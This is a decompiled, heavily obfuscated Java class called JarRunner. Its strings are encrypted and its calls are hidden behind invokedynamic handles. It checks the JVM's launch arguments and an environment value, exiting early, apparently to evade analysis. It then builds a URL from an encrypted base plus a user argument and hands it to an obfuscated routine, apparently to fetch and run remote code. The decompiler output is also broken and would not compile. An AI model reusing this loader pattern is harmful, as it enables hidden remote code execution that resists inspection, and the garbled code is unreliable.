// 
// Decompiled by Procyon v0.5.36
// 

package andre;

import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodType;
import java.lang.invoke.MethodHandles;
import java.util.Random;
import java.io.PrintStream;
import java.util.Iterator;
import java.net.MalformedURLException;
import java.net.URL;

public class JarRunner
{
    public static URL url;
    
    static {
        g.C(97078067, null);
    }
    
    public static void main(final String[] array) {
        final Iterator<String> iterator = invokedynamic(176oipi:()Ljava/lang/management/RuntimeMXBean;).getInputArguments().iterator();
        while (iterator.hasNext()) {
            if (invokedynamic(-1vohd6g:(Ljava/lang/Object;Ljava/lang/Object;)Z, invokedynamic(-1spfd6f:(Ljava/lang/Object;)Ljava/lang/String;, (String)iterator.next()), l.h("\u51b7\u1f61\u494e\u9347\u9d08\ufd13\uc5af\u6937\ufced"))) {
                // invokedynamic(i2gipv:(I)V, true)
                return;
            }
        }
        // invokedynamic(-10end62:(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/String;, l.h((Object)"\u5199\u1f69\u494b\u9347\u9d0b\ufd18\uc5af\u6918\ufced\u7629\u167f\u6645\ub266\u1a1a\ueb5a\u5931\ue779\u7d65\ufe1d\u69fc\ub64b\u4f58"), l.h((Object)"\u51a9\u1f72\u494d\u9343"))
        // invokedynamic(-10end62:(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/String;, l.h((Object)"\u51b7\u1f64\u4953\u9308\u9d01\ufd00\uc5be\u6929\ufcb7\u763c\u166b\u6652\ub266\u1a79\ueb4b\u5927\ue77f\u7d6a\ufe16\u69f9\ub651\u4f5b\u4012\u3339\ucb8f\u2094\u2239\u0f70\ua9a5\u6e25\u51a8\uc667\u113e\u5db1\u6fca\u257f\u245d\uf049\ua194"), "")
        if (invokedynamic(8muimd:(Ljava/lang/Object;)Ljava/lang/String;, l.h("\u51b7\u1f61\u494e\u9347\u9d08\ufd13\uc5af\u6937\ufced")) != null) {
            // invokedynamic(i2gipv:(I)V, true)
            return;
        }
        String s = "";
        int n = 0;
        for (final String s2 : array) {
            if (n != 0) {
                s = s2;
                break;
            }
            if (invokedynamic(chiimc:(Ljava/lang/Object;Ljava/lang/Object;)Z, invokedynamic(-1spfd6f:(Ljava/lang/Object;)Ljava/lang/String;, s2), l.h("\u51b1")) || invokedynamic(chiimc:(Ljava/lang/Object;Ljava/lang/Object;)Z, invokedynamic(-1spfd6f:(Ljava/lang/Object;)Ljava/lang/String;, s2), l.h("\u51b1\u1f69\u495b\u9343\u9d07\ufd07\uc5af"))) {
                n = 1;
            }
        }
        if (invokedynamic(hrqimb:(Ljava/lang/Object;)Z, s)) {
            errorEnd(l.h("\u5184\u1f6f\u494d\u9306\u9d08\ufd06\uc5af\u6979\ufcf4\u7634\u166d\u6655\ub267\u1a39\ueb58\u5972\ue765\u7d6c\ufe16\u69b5\ub654\u4f5c\u4016\u3372\ucb85\u208e\u222f\u0f31\ua9a8\u6e39\u51b9\uc66a\u1102\u5dbc\u6f83\u253a\u2460\uf040\ua182\u0c84\u9532\u9557\u8481\u47a5\u8f5d\u75cd\uf2b7\ud999\u862a\u0566\ue743\u0362\u0961\uf9ec\u3a1c\u12d9\u27cf\ub3c1\u5248\u9e04\u663f\u1175\u6fa3\u35f0\ubc05\ub5c2\u1f1f\u48d9\u53e2\u44db\ud211\uaa96\ue49a\u412f\uacce\u69ac\ueddd\u0400\uc914\ua677\u2b72\u0914"));
        }
        try {
            g.C(97078067, new URL(invokedynamic(-prtd9n:(Ljava/lang/Object;)Ljava/lang/String;, invokedynamic(-sebd9m:(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;, invokedynamic(-sebd9m:(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/StringBuilder;, new StringBuilder(l.h("\u51b5\u1f74\u494c\u9356\u9d1a\ufd4e\uc5e5\u6976\ufcf8\u762d\u1677\u6608\ub26b\u1a22\ueb4f\u593a\ue77e\u7d76\ufe1a\u69f4\ub64a\u4f46\u4005\u3364\ucbc5\u209e\u2225\u0f7c\ua9e8\u6e25\u51a4\uc660\u1108\u5dbc\u6fd1\u257f\u246f\uf01e\ua1c9\u0c95\u9529\u9542\u849e\u47af\u8f4b\u75df\uf2aa")), s), l.h("\u51fb\u1f76\u495d\u9354\u9d54\ufd30\uc5a5\u692e\ufcf7\u7631\u1671\u6647\ub26a")))));
        }
        catch (MalformedURLException ex) {
            errorEnd(l.h("\u5198\u1f72\u494a\u9349\u9d1b\ufd54\uc5bd\u6930\ufced\u7635\u163e\u664a\ub267\u1a39\ueb54\u597c"));
        }
    }
    // invokedynamic(qosim8:([Ljava/lang/String;)V, array)
    
    public static void errorEnd(final String s) {
    }
    // invokedynamic(-1qcdd9t:(Ljava/lang/Object;Ljava/lang/Object;)V, (PrintStream)g.S(833702711), invokedynamic(1ockim4:(Ljava/lang/Object;)Ljava/lang/String;, (NameGenerator[])invokedynamic(-116dd6a:()Ljava/lang/Object;)[invokedynamic(-jepd9r:(Ljava/lang/Object;I)I, new Random(), (NameGenerator[])invokedynamic(-116dd6a:()Ljava/lang/Object;).length)]))
    // invokedynamic(-1qcdd9t:(Ljava/lang/Object;Ljava/lang/Object;)V, (PrintStream)g.S(833702711), l.h((Object)"\u7cd2\u5f42\u0809\u5c3e\uec11\u6287\u5f96\u91de\uf97f\u5055\ucb88\u4f49\u1c69\ud40a\u6ac8\uca3d\u4e4c\ua7c0\u53f2\u61f1\u8d7d\ue994\u23bd\ud6d3\uea9b\u89c5\u2b78\u73be\ub73e\u6554\u99a7"))
    // invokedynamic(-1qcdd9t:(Ljava/lang/Object;Ljava/lang/Object;)V, (PrintStream)g.S(833702711), l.h((Object)"\u7cdd\u5f64\u0828\u5c14\uec7e\u62b7\u5fcd\u919a\uf94c\u5010\ucb98\u4f43\u1c3a\ud445\u6ace\uca73\u4e18\ua7e6\u53b3\u61fb\u8d60\ue98b\u23e1\ud690\ueadc\u8984\u2b27\u73e4\ub763\u654b\u9988\ua05c\u11e7\u04a9\u7146"))
    // invokedynamic(-1qcdd9t:(Ljava/lang/Object;Ljava/lang/Object;)V, (PrintStream)g.S(833702711), l.h((Object)"\u7ca3\u5f21\u0806\u5c34\uec09\u629b\u5ff5\u91ad\uf909\u5066\ucbbf\u4f68\u1c49\ud423\u6aff\uca27\u4e23\ua7d8\u53e0\u618e\u8d1a\ue9f6\u23b3\ud6a7\ueae1\u89b8\u2b0b\u73c7\ub742\u6521\u99cb\ua072\u11d7\u048d\u7126\u9ce8\uf4bc\u449a\u051e\uf6f8\uf608\u157b\u4ad8\u9390\ua3af\u917c\ud34c\u6a8e\u24a2\ue572\u36e8\u368d\u3cdd\u00f9\u1193\u119a\udcf2\u6a8e\u3dab\u29a1\u9375"))
    // invokedynamic(-1qcdd9t:(Ljava/lang/Object;Ljava/lang/Object;)V, (PrintStream)g.S(833702711), s)
    // invokedynamic(i2gipv:(I)V, true)
    
    private static Object Nv(final Object o, final Object o2, final Object o3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)o).unreflect(g.v(Integer.valueOf((String)o2, 32))).asType((MethodType)o3));
        }
        catch (ClassNotFoundException | IllegalAccessException ex) {
            final Object cause;
            throw new BootstrapMethodError((Throwable)cause);
        }
    }
}
